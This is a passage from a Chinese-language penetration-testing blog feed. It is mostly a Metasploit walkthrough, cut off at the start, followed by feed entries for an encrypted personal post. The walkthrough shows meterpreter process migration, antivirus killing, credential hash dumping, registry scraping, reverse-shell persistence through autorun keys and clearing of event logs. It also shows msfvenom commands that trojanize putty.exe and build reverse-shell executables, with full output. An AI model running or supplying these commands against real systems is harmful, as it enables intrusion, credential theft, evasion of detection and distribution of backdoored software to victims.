getpid</span><br><span class="line">Current pid: 1128</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/manage/migrate</span><br><span class="line">[*] Running module against WIN-VONVJ6OMEQ7</span><br><span class="line">[*] Current server process: spoolsv.exe (1128)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3592</span><br><span class="line">[+] Successfully migrated to process 3592</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 3592</span><br></pre></td></tr></table></figure></p><p>4)关闭杀毒软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.</span><br><span class="line">[!] Example: run post/windows/manage/killav OPTION=value [...]</span><br><span class="line">[*] Killing Antivirus services on the target...</span><br></pre></td></tr></table></figure></p><p>5)查看目标机上的所有来流量<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run packetrecorder -i 1</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.</span><br><span class="line">[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...]</span><br><span class="line">[*] Starting Packet capture on interface 1</span><br><span class="line">[+] Packet capture started</span><br><span class="line">[*] Packets being saved in to /root/.msf4/logs/scripts/packetrecorder/WIN-VONVJ6OMEQ7_20180501.0138/WIN-VONVJ6OMEQ7_20180501.0138.cap</span><br><span class="line">[*] Packet capture interval is 30 Seconds</span><br></pre></td></tr></table></figure></p><p>5)得到目标主机系统用户的哈希值<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></p><p>6)得到详细的系统信息<br>用户名和密码、下载全部注册表、挖掘密码哈希值和收集系统信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run scraper</span><br><span class="line">[*] New session on 192.168.1.187:445...</span><br><span class="line">[*] Gathering basic system information...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Obtaining the entire registry...</span><br><span class="line">[*]  Exporting HKCU</span><br><span class="line">[*]  Downloading HKCU (C:\Windows\TEMP\JKaHEoEs.reg)</span><br><span class="line">[*]  Cleaning HKCU</span><br><span class="line">[*]  Exporting HKLM</span><br><span class="line">[*]  Downloading HKLM (C:\Windows\TEMP\qCMsnidu.reg)</span><br><span class="line">[*]  Cleaning HKLM</span><br><span class="line">[*]  Exporting HKCC</span><br><span class="line">[*]  Downloading HKCC (C:\Windows\TEMP\PTbboPFX.reg)</span><br><span class="line">[*]  Cleaning HKCC</span><br><span class="line">[*]  Exporting HKCR</span><br><span class="line">[*]  Downloading HKCR (C:\Windows\TEMP\AQMWnvZo.reg)</span><br><span class="line">[*]  Cleaning HKCR</span><br><span class="line">[*]  Exporting HKU</span><br><span class="line">[*]  Downloading HKU (C:\Windows\TEMP\XNLnHUgE.reg)</span><br><span class="line">[*]  Cleaning HKU</span><br><span class="line">[*] Completed processing on 192.168.1.187:445...</span><br></pre></td></tr></table></figure></p><p>7）控制持久化<br>-X 开机自启动，-i 40每40秒重连一次 -p指定端口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 40 -p 443 -r 192.168.1.187 </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-VONVJ6OMEQ7_20180501.2631/WIN-VONVJ6OMEQ7_20180501.2631.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=443</span><br><span class="line">[*] Persistent agent script is 99671 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[*] Executing script C:\Windows\TEMP\ManzZNr.vbs</span><br><span class="line">[+] Agent executed with PID 3852</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa</span><br></pre></td></tr></table></figure></p><p>开始连接<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.1.187</span><br><span class="line">lhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></p><p>8）列出所有后渗透模块<br><code>run post/</code> 后，按tab见<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/</span><br><span class="line">Display all 207 possibilities? (y or n)</span><br></pre></td></tr></table></figure></p><p>9.Railgun组件操作windows API<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell</span><br><span class="line">[*] The &quot;client&quot; variable holds the meterpreter client</span><br><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure></p><p>结果如下图<br><img src="/posts/../../images/zhahun/1.png" alt=""><br>10.将shell提升为meterpreter<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt; # ctrl+z 把会话放在后台 </span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type               Information                                                                       Connection</span><br><span class="line">  --  ----  ----               -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.230:4411 -&gt; 192.168.1.187:54038 (192.168.1.187)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -u 1  #升级为meterpreter</span><br></pre></td></tr></table></figure></p><p>11.隐藏踪迹<br>清除了所有日志，容易被发现。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run event_manager</span><br><span class="line">Meterpreter Script for Windows Event Log Query and Clear.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -c &lt;opt&gt;  Clear a given Event Log (or ALL if no argument specified)</span><br><span class="line">    -f &lt;opt&gt;  Event ID to filter events on</span><br><span class="line">    -h        Help menu</span><br><span class="line">    -i        Show information about Event Logs on the System and their configuration</span><br><span class="line">    -l &lt;opt&gt;  List a given Event Log.</span><br><span class="line">    -p        Supress printing filtered logs to screen</span><br><span class="line">    -s &lt;opt&gt;  Save logs to local CSV file, optionally specify alternate folder in which to save logs</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run event_manager -c</span><br><span class="line">[-] You must specify and eventlog to query!</span><br><span class="line">[*] Application: </span><br><span class="line">[*] Clearing Application</span><br><span class="line">[*] Event Log Application Cleared!</span><br><span class="line">[*] HardwareEvents: </span><br><span class="line">[*] Clearing HardwareEvents</span><br><span class="line">[*] Event Log HardwareEvents Cleared!</span><br><span class="line">[*] Internet Explorer: </span><br><span class="line">[*] Clearing Internet Explorer</span><br><span class="line">[*] Event Log Internet Explorer Cleared!</span><br><span class="line">[*] Key Management Service: </span><br><span class="line">[*] Clearing Key Management Service</span><br><span class="line">[*] Event Log Key Management Service Cleared!</span><br><span class="line">[*] Security: </span><br><span class="line">[*] Clearing Security</span><br><span class="line">[*] Event Log Security Cleared!</span><br><span class="line">[*] System: </span><br><span class="line">[*] Clearing System</span><br><span class="line">[*] Event Log System Cleared!</span><br><span class="line">[*] ThinPrint Diagnostics: </span><br><span class="line">[*] Clearing ThinPrint Diagnostics</span><br><span class="line">[*] Event Log ThinPrint Diagnostics Cleared!</span><br><span class="line">[*] Windows PowerShell: </span><br><span class="line">[*] Clearing Windows PowerShell</span><br><span class="line">[*] Event Log Windows PowerShell Cleared!</span><br></pre></td></tr></table></figure></p><h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已然成为历史，取而代之的是msfvenom<br>1.常识<br>参数含义：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -h</span><br><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">Also a replacement for msfpayload and msfencode.</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &apos;-&apos; or stdin to use custom payloads</span><br><span class="line">        --payload-options            List the payload&apos;s standard options</span><br><span class="line">    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all</span><br><span class="line">    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload</span><br><span class="line">    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)</span><br><span class="line">        --help-formats               List available formats</span><br><span class="line">    -e, --encoder       &lt;encoder&gt;    The encoder to use</span><br><span class="line">    -a, --arch          &lt;arch&gt;       The architecture to use</span><br><span class="line">        --platform      &lt;platform&gt;   The platform of the payload</span><br><span class="line">        --help-platforms             List available platforms</span><br><span class="line">    -s, --space         &lt;length&gt;     The maximum size of the resulting payload</span><br><span class="line">        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &apos;\x00\xff&apos;</span><br><span class="line">    -i, --iterations    &lt;count&gt;      The number of times to encode the payload</span><br><span class="line">    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the template behavior and inject the payload as a new thread</span><br><span class="line">    -o, --out           &lt;path&gt;       Save the payload</span><br><span class="line">    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats</span><br><span class="line">        --smallest                   Generate the smallest possible payload</span><br><span class="line">    -h, --help                       Show this message</span><br></pre></td></tr></table></figure></p><p>1)查看payload<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  msfvenom -l payloads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Framework Payloads (507 total)</span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">    Name                                                Description</span><br><span class="line">    ----                                                -----------</span><br><span class="line">    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    aix/ppc/shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)</span><br><span class="line">    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP</span><br><span class="line">    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS</span><br><span class="line">    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager</span><br><span class="line"> ……</span><br></pre></td></tr></table></figure></p><p>2)查看编码方法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/echo                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Generic $&#123;IFS&#125; Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The &quot;none&quot; Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/xor                       normal     XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure></p><p>exclent级别<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd/powershell_base64  </span><br><span class="line">x86/shikata_ga_nai</span><br></pre></td></tr></table></figure></p><p>3)查看nops选项（空字段模块，为了绕过和免杀）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~# msfvenom -l nops</span><br><span class="line"></span><br><span class="line">Framework NOPs (10 total)</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Name             Description</span><br><span class="line">    ----             -----------</span><br><span class="line">    aarch64/simple   Simple NOP generator</span><br><span class="line">    armle/simple     Simple NOP generator</span><br><span class="line">    mipsbe/better    Better NOP generator</span><br><span class="line">    php/generic      Generates harmless padding for PHP scripts</span><br><span class="line">    ppc/simple       Simple NOP generator</span><br><span class="line">    sparc/random     SPARC NOP generator</span><br><span class="line">    tty/generic      Generates harmless padding for TTY input</span><br><span class="line">    x64/simple       An x64 single/multi byte NOP instruction generator.</span><br><span class="line">    x86/opty2        Opty2 multi-byte NOP generator</span><br><span class="line">    x86/single_byte  Single-byte NOP generator</span><br></pre></td></tr></table></figure></p><p>4)可支持的平台<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~# msfvenom --help-platforms</span><br><span class="line">Platforms</span><br><span class="line">aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unix, windows</span><br></pre></td></tr></table></figure></p><p>5)可生成的格式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom --help-formats</span><br><span class="line">Executable formats</span><br><span class="line">asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war</span><br><span class="line">Transform formats</span><br><span class="line">bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</span><br></pre></td></tr></table></figure></p><p>6)查payload选项<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    ----  ---------------  --------  -----------</span><br><span class="line">root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp --payload-options</span><br><span class="line">Options for payload/windows/x64/meterpreter/reverse_tcp:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       Name: Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">     Module: payload/windows/x64/meterpreter/reverse_tcp</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x64 #是指生成的payload只能在64位系统运行 </span><br><span class="line">Needs Admin: No</span><br><span class="line"> Total size: 449</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">    skape &lt;mmiller@hick.org&gt;</span><br><span class="line">    sf &lt;stephen_fewer@harmonysecurity.com&gt;</span><br><span class="line">    OJ Reeves</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">Name      Current Setting  Required  Description</span><br><span class="line">----      ---------------  --------  -----------</span><br><span class="line">EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">LHOST                      yes       The listen address</span><br><span class="line">LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Inject the meterpreter server DLL via the Reflective Dll Injection </span><br><span class="line">  payload (staged x64). Connect back to the attacker (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Advanced options for payload/windows/x64/meterpreter/reverse_tcp:</span><br><span class="line"></span><br><span class="line">    Name                         Current Setting  Required  Description</span><br><span class="line">    ----                         ---------------  --------  -----------</span><br><span class="line">    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension</span><br><span class="line">    AutoRunScript                                 no        A script to run automatically on session creation.</span><br></pre></td></tr></table></figure></p><p>2.生成payload<br>1)将payload注入到putty中(会被360杀掉）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/xmeterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4443 -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /root/putty.exe -k -f exe -o /root/Desktop/putty_evil.exe</span><br><span class="line">Skipping invalid encoder x64/shikata_ga_nai</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 867840 bytes</span><br><span class="line">Saved as: /root/Desktop/putty_evil.exe</span><br></pre></td></tr></table></figure></p><p>2)windows x64(被杀）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4441 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></p><p>3)linux<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.230  LPORT=4441 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>三秒钟的记忆</title>
      <link href="/posts/11dc13a6.html"/>
      <url>/posts/11dc13a6.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" 请输入文章密码！ "> <label for="pass"> 请输入文章密码！ </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      <categories>
          
          <category> 生活 </category>
          
          <category> 胡思乱想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 胡思乱想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>混生活吗？</title>
      <link href="/posts/d851c108.html"/>
      <url>/posts/d851c108.html</url>
